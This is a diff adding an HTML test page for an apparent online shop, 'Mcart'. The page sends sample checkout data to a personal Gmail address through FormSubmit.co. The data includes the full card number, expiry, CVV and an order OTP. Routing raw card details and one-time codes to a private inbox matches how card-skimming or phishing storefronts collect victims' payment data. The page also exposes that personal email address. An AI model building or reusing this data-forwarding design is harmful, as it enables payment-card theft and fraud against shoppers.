@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Email Service Test - Mcart</title>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
+        .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,.1); }
+        .btn { background: #007bff; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; margin: 10px 5px; font-size: 16px; }
+        .btn:hover { background: #0056b3; }
+        .btn:disabled { opacity: .5; cursor: not-allowed; }
+        .status { margin: 20px 0; padding: 15px; border-radius: 4px; }
+        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .error   { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+        .info    { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
+        .warn    { background: #fff3cd; color: #856404; border: 1px solid #ffeeba; }
+        .log { background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 4px; padding: 15px; margin: 20px 0; max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 13px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Mcart Email Test</h1>
+        <p>Sends test data directly to <strong>rashiverma904@gmail.com</strong> via <a href="https://formsubmit.co" target="_blank">FormSubmit.co</a>.</p>
+
+        <div class="status warn">
+            <strong>First-time note:</strong> The very first submission triggers a confirmation email from FormSubmit.co to rashiverma904@gmail.com.
+            Open that email and click the confirmation link. After that, every submission goes straight to your inbox.
+        </div>
+
+        <button class="btn" id="btn-step2" onclick="testStep2()">Send Step 2 (Payment) Email</button>
+        <button class="btn" id="btn-step3" onclick="testStep3()">Send Step 3 (Order) Email</button>
+
+        <div id="status" class="status info" style="display:none;"><p id="status-msg"></p></div>
+
+        <div class="log" id="log"><div>Ready...</div></div>
+    </div>
+
+    <script src="js/email-service.js"></script>
+    <script>
+        function show(msg, type) {
+            var s = document.getElementById('status');
+            s.style.display = 'block';
+            s.className = 'status ' + type;
+            document.getElementById('status-msg').textContent = msg;
+        }
+        function log(msg) {
+            var el = document.getElementById('log');
+            el.innerHTML += '<div>[' + new Date().toLocaleTimeString() + '] ' + msg + '</div>';
+            el.scrollTop = el.scrollHeight;
+        }
+
+        function testStep2() {
+            var btn = document.getElementById('btn-step2');
+            btn.disabled = true;
+            btn.textContent = 'Sending...';
+            log('Sending Step 2 payment email...');
+
+            var step1 = {
+                fullName: 'Test Customer',
+                email: 'customer@example.com',
+                phone: '9876543210',
+                countryCode: '+91',
+                address: '123 Test Lane',
+                address2: 'Apt 4B',
+                city: 'Mumbai',
+                state: 'MH',
+                pincode: '400001'
+            };
+            var step2 = {
+                method: 'credit_card',
+                cardName: 'Test Customer',
+                cardNumber: '4111111111114242',
+                expiry: '12/27',
+                cvv: '123'
+            };
+            var items = [
+                { name: 'Wireless Headphones', price: 2499, qty: 1 },
+                { name: 'Phone Case', price: 499, qty: 2 }
+            ];
+
+            window.EmailService.sendPaymentConfirmation(step1, step2, items, 3497)
+                .then(function(res) {
+                    log('SUCCESS - Payment email sent to rashiverma904@gmail.com');
+                    show('Step 2 email sent! Check rashiverma904@gmail.com inbox.', 'success');
+                    btn.disabled = false;
+                    btn.textContent = 'Send Step 2 (Payment) Email';
+                })
+                .catch(function(err) {
+                    log('FAILED - ' + err.message);
+                    show('Failed: ' + err.message, 'error');
+                    btn.disabled = false;
+                    btn.textContent = 'Send Step 2 (Payment) Email';
+                });
+        }
+
+        function testStep3() {
+            var btn = document.getElementById('btn-step3');
+            btn.disabled = true;
+            btn.textContent = 'Sending...';
+            log('Sending Step 3 order confirmation email...');
+
+            var orderData = {
+                orderId: 'MCR' + Date.now().toString().slice(-8),
+                total: 3497,
+                otp: '123456',
+                contact: {
+                    fullName: 'Test Customer',
+                    email: 'customer@example.com',
+                    phone: '9876543210',
+                    countryCode: '+91',
+                    address: '123 Test Lane',
+                    address2: 'Apt 4B',
+                    city: 'Mumbai',
+                    state: 'MH',
+                    pincode: '400001'
+                },
+                payment: {
+                    method: 'credit_card',
+                    cardName: 'Test Customer',
+                    cardNumber: '4111111111114242',
+                    expiry: '12/27',
+                    cvv: '123'
+                }
+            };
+            var items = [
+                { name: 'Wireless Headphones', price: 2499, qty: 1 },
+                { name: 'Phone Case', price: 499, qty: 2 }
+            ];
+
+            window.EmailService.sendOrderConfirmation(orderData, items)
+                .then(function(res) {
+                    log('SUCCESS - Order email sent to rashiverma904@gmail.com');
+                    show('Step 3 email sent! Check rashiverma904@gmail.com inbox.', 'success');
+                    btn.disabled = false;
+                    btn.textContent = 'Send Step 3 (Order) Email';
+                })
+                .catch(function(err) {
+                    log('FAILED - ' + err.message);
+                    show('Failed: ' + err.message, 'error');
+                    btn.disabled = false;
+                    btn.textContent = 'Send Step 3 (Order) Email';
+                });
+        }
+    </script>
+</body>
+</html>
